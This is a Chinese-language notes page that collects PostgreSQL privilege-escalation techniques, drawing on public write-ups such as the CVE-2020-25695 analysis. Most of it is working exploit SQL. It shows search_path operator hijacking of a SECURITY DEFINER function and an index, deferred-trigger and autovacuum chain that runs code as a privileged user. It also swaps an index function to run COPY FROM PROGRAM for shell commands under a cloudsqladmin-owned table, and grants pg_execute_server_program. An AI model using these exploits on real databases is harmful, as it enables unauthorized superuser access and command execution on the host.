# postgresql权限提升总结

## 参考文章：

https://www.cybertec-postgresql.com/en/abusing-security-definer-functions/

https://staaldraad.github.io/post/2020-12-15-cve-2020-25695-postgresql-privesc/

https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql

## docker创建环境

```
docker pull postgres:10.0

docker run --name my_postgres -e POSTGRES_PASSWORD=123456 -d -p 5432:5432 postgres:10.0
```

## 高权限自定义函数问题

创建危险函数

高权限用户运行

```
CREATE FUNCTION public.harmless(integer) RETURNS integer
   LANGUAGE sql SECURITY DEFINER AS
'SELECT $1 + 1';
```

SECURITY DEFINER代表运行函数时会使用创建函数的用户的权限


低权限运行

```
CREATE FUNCTION public.sum(integer, integer) RETURNS integer
   LANGUAGE sql AS
'INSERT INTO public.t1 VALUES (current_user); SELECT $1 OPERATOR(pg_catalog.+) $2';

CREATE OPERATOR public.+ (
   PROCEDURE = public.sum,
   LEFTARG = integer,
   RIGHTARG = integer
);

SET search_path = public,pg_catalog;

SELECT public.harmless(41);
```

search_path的意思是 先去public寻找函数harmless函数

运行harmless时是高权限账号 导致INSERT INTO public.t1 VALUES (current_user);插入的是高权限账号

## 触发器漏洞

整体流程

高权限运行索引-调用sfunc（低权限）-插入t0（低权限）-调用触发器-调用strig-调用snfunc（高权限）

使用

autovacuum_vacuum_threshold、autovacuum_analyze_threshold完成自动化

```
CREATE TABLE t0 (s varchar);

CREATE TABLE blah (a int, b int);
INSERT INTO blah VALUES (1,1); -- 必须要插入数据


CREATE FUNCTION sfunc(integer) 
  RETURNS integer
  LANGUAGE sql IMMUTABLE AS
  'SELECT $1';

CREATE INDEX indy ON blah (sfunc(a));

/*
使用替换的函数绕过IMMUTABLE，IMMUTABLE的意思是同样的参数只运行一次 后面传入参数一样的情况下都不再运行
*/

CREATE OR REPLACE FUNCTION sfunc(integer) RETURNS integer
   LANGUAGE sql 
   SECURITY INVOKER AS
'INSERT INTO public.t0 VALUES (current_user); SELECT $1';


CREATE TABLE t1 (s varchar);

-- create a function for inserting current user into another table

CREATE OR REPLACE FUNCTION snfunc(integer) RETURNS integer
   LANGUAGE sql 
   SECURITY INVOKER AS
'INSERT INTO public.t1 VALUES (current_user); SELECT $1';

-- create a trigger function which will call the second function for inserting current user into table t1
CREATE OR REPLACE FUNCTION strig() RETURNS trigger 
  AS $e$ BEGIN 
    PERFORM snfunc(1000); RETURN NEW; 
  END $e$ 
LANGUAGE plpgsql;

/* create a CONSTRAINT TRIGGER, which is deferred
 deferred causes it to trigger on commit, by which time the user has been switched back to the
 invoking user, rather than the owner
*/
CREATE CONSTRAINT TRIGGER def
    AFTER INSERT ON t0
    INITIALLY DEFERRED 
    FOR EACH ROW
  EXECUTE PROCEDURE strig();

ALTER TABLE blah SET (autovacuum_vacuum_threshold = 1);
ALTER TABLE blah SET (autovacuum_analyze_threshold = 1);
```

### SQL注入 高权限创建的函数

高权限创建的函数

![QQ_1732160674745](https://github.com/user-attachments/assets/8cf643e5-35ed-4f6e-9856-aad0b3d5c054)

低权限执行

![QQ_1732160720976](https://github.com/user-attachments/assets/35974216-ded7-4977-a72d-54795fb5a617)

实际是高权限执行的是

```
INSERT INTO public.test3(data) VALUES(current_user);
```

### postgresql用户组

可以将表的owner给用户组

创建一个索引函数

然后执行刷新 触发索引

身份变为用户组

```
CREATE TABLE temp_table (data text); 
CREATE TABLE shell_commands_results (data text); 
 
INSERT INTO temp_table VALUES ('dummy content'); 
 
/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */ 
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text 
  LANGUAGE sql IMMUTABLE AS 'select ''nothing'';'; 
 
CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

/*
自己要在cloudsqladmin里面
*/
 
ALTER TABLE temp_table OWNER TO cloudsqladmin;
 
/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */ 
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text 
  LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';'; 
 
ANALYZE public.temp_table; 

```

### grant权限提权

直接创建一个有权限的用户

pg_read_server_files
pg_write_server_files
pg_execute_server_program

```
CREATE USER james CREATEDB IN GROUP 
  pg_read_server_files,
  pg_write_server_files,
  pg_execute_server_program ROLE postgres;
```

